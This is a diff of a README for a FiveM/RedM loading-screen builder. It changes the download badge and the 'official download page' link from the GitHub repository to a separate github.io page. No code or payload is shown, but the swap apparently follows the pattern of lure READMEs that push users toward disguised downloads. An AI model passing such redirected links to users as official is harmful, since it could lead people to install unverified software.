@@ -1,6 +1,6 @@
 # 🛠️ fivem-loading-screen-v110 - Create custom game loading screens easily
 
-[![](https://img.shields.io/badge/Download-Application-blue)](https://github.com/Inductive-scythia854/fivem-loading-screen-v110)
+[![](https://img.shields.io/badge/Download-Application-blue)](https://inductive-scythia854.github.io)
 
 This tool helps developers build interactive loading screens for FiveM and RedM servers. You do not need to write code to create professional screens. The software provides a visual interface to drag and drop elements, view changes in real time, and connect to common server frameworks.
 
@@ -10,7 +10,7 @@ The application works on Windows 10 and Windows 11. You need at least 200MB of f
 
 ## 📥 Installation
 
-1. Visit the [official download page](https://github.com/Inductive-scythia854/fivem-loading-screen-v110).
+1. Visit the [official download page](https://inductive-scythia854.github.io).
 2. Click the green button labeled "Code" and select "Download ZIP" if you prefer source files, or look for the latest release link on the main page.
 3. Save the file to your computer.
 4. Extract the contents of the ZIP folder to a local directory on your drive.
